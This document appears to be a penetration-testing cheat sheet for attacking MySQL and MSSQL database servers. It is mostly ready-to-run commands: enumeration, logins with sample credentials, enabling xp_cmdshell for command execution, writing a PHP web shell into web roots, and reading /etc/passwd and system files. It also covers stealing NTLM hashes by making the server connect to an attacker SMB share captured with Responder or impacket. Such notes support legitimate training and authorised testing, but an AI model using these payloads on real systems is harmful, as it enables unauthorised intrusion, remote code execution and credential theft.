#  SQL Databases
## Enumeration
 * [MXToolbox](https://mxtoolbox.com/)
 * [smtp-user-enum](https://github.com/pentestmonkey/smtp-user-enum)

```
nmap -Pn -sV -sC -p1433 $rhost
nmap -Pn -sV -sC -p1433 10.10.10.125 # Example
```
## Authentication Mechanisms

### MSSQL

MSSQL supports two [authentication modes](https://learn.microsoft.com/en-us/sql/connect/ado-net/sql/authentication-sql-server?view=sql-server-ver16), which means that users can be created in Windows or the SQL Server:
1. **Windows authentication mode:** This is the default, often referred to as integrated security because the SQL Server security model is tightly integrated with Windows/Active Directory. Specific Windows user and group accounts are trusted to log in to SQL Server. Windows users who have already been authenticated do not have to present additional credentials. 
2. **Mixed mode**: Mixed mode supports authentication by Windows/Active Directory accounts and SQL Server. Username and password pairs are maintained within SQL Server.

### MySQL
MySQL also supports different authentication methods, such as username and password, as well as Windows authentication (a plugin is required). In addition, administrators can choose an authentication mode for many reasons, including compatibility, security, usability, and more. However, depending on which method is implemented, misconfigurations can occur.

### MySQL - Connecting to the SQL Server

```
mysql -u $username -p$password -h $rhost
mysql -u julio -pPassword123 -h 10.129.20.13 # Example
```

### Sqlcmd - Connecting to the SQL Server

```
sqlcmd -S SRVMSSQL -U $username -P '$password' -y 30 -Y 30
sqlcmd -S SRVMSSQL -U julio -P 'MyPassword!' -y 30 -Y 30 # Example

Note: When we authenticate to MSSQL using sqlcmd we can use the parameters -y (SQLCMDMAXVARTYPEWIDTH) and -Y (SQLCMDMAXFIXEDTYPEWIDTH) for better looking output. Keep in mind it may affect performance.
```
Alternatively, we can use the tool from Impacket with the name mssqlclient.py
```
mssqlclient.py -p $port $user@$rhost
mssqlclient.py -p 1433 julio@10.129.203.7 # Example

Note: When we authenticate to MSSQL using sqsh we can use the parameters -h to disable headers and footers for a cleaner look.
```
When using Windows Authentication, we need to specify the domain name or the hostname of the target machine. If we don't specify a domain or hostname, it will assume SQL Authentication and authenticate against the users created in the SQL Server. Instead, if we define the domain or hostname, it will use Windows Authentication. If we are targetting a local account, we can use SERVERNAME\\accountname or. The full command would look like:
```
sqsh -S $rhost -U .\\$username -P '$password' -h
sqsh -S 10.129.203.7 -U .\\julio -P 'MyPassword!' -h # Example
```

## SQL Default Databases

MySQL default system schemas/databases:
  1. mysql - is the system database that contains tables that store information required by the MySQL server information_schema - provides access to database metadata
  2. performance_schema - is a feature for monitoring MySQL Server execution at a low level
  3. sys - a set of objects that helps DBAs and developers interpret data collected by the Performance Schema

MSSQL default system schemas/databases:

  1. master - keeps the information for an instance of SQL Server.
  2. msdb - used by SQL Server Agent.
  3. model - a template database copied for each new database.
  4. resource - a read-only database that keeps system objects visible in every database on the server in sys schema.
  5. tempdb - keeps temporary objects for SQL queries.

## SQL Syntax
### Show Databases
```
SHOW DATABASES; # MySQL
SELECT name FROM master.dbo.sysdatabases
GO ## MSSQL
```

### Select a Database
```
USE $database; # MySQL and MSSQL
USE users; # MySQL Example
USE users
GO # MSSQL Example
```

### Show Tables
```
SHOW TABLES; # MySQL
SELECT table_name FROM $table.INFORMATION_SCHEMA.TABLES
GO # MSSQL
SELECT table_name FROM htbusers.INFORMATION_SCHEMA.TABLES 
GO # MSSQL Example
```

### Select all Data from Table "table"
```
SELECT * FROM $table;
SELECT * FROM users; # MySQL example
SELECT * FROM users; # MySQL example
GO
```

## Execute Commands

To execute commands using SQL syntax on MSSQL, use:
```
xp_cmdshell '$command'
xp_cmdshell 'whoami' # Example
GO
```
If xp_cmdshell is not enabled, we can enable it, if we have the appropriate privileges, using the following command:
```
-- To allow advanced options to be changed.  
EXECUTE sp_configure 'show advanced options', 1
GO

-- To update the currently configured value for advanced options.  
RECONFIGURE
GO  

-- To enable the feature.  
EXECUTE sp_configure 'xp_cmdshell', 1
GO  

-- To update the currently configured value for this feature.  
RECONFIGURE
GO
```

## MySQL - Write Local File
```
SELECT "$string" INTO OUTFILE '$output';
SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php'; # Example
```

In MySQL, a global system variable secure_file_priv limits the effect of data import and export operations, such as those performed by the LOAD DATA and SELECT â€¦ INTO OUTFILE statements and the LOAD_FILE() function. These operations are permitted only to users who have the FILE privilege.

*secure_file_priv* may be set as follows:
 * If empty, the variable has no effect, which is not a secure setting.
 * If set to the name of a directory, the server limits import and export operations to work only with files in that directory. The directory must exist; the server does not create it.
 * If set to NULL, the server disables import and export operations.

```
mysql> show variables like "secure_file_priv";
```
## MSSQL - Enable Ole Automation Procedures

To write files using MSSQL, we need to enable [Ole Automation Procedures](https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/ole-automation-procedures-server-configuration-option?view=sql-server-ver16), which requires admin privileges, and then execute some stored procedures to create the file:

```
sp_configure 'show advanced options', 1;  
GO  
RECONFIGURE;  
GO  
sp_configure 'Ole Automation Procedures', 1;  
GO  
RECONFIGURE;  
GO  
```

### MSSQL - Create a File
```
DECLARE @OLE INT
DECLARE @FileID INT
EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
EXECUTE sp_OADestroy @FileID
EXECUTE sp_OADestroy @OLE
GO
```
### Read Local Files in MSSQL
```
ELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
GO
```

## MySQL - Read Local Files in MySQL
```
select LOAD_FILE("/etc/passwd");
```

## XP_DIRTREE Hash Stealing
```
EXEC master..xp_dirtree '\\10.10.110.17\share\'
GO
```

## XP_SUBDIRS Hash Stealing
```
EXEC master..xp_subdirs '\\10.10.110.17\share\'
GO
```

## XP_SUBDIRS Hash Stealing with Responder
```
sudo responder -I [interface]
sudo responder -I tun0 # Example
```

## XP_SUBDIRS Hash Stealing with impacket
```
sudo impacket-smbserver share ./ -smb2support
```

## Impersonate Existing Users with MSSQL

SQL Server has a special permission, named IMPERSONATE, that allows the executing user to take on the permissions of another user or login until the context is reset or the session ends. Let's explore how the IMPERSONATE privilege can lead to privilege escalation in SQL Server.

### Identify Users that We Can Impersonate

```
SELECT distinct b.name
FROM sys.server_permissions a
INNER JOIN sys.server_principals b
ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE'
GO
```



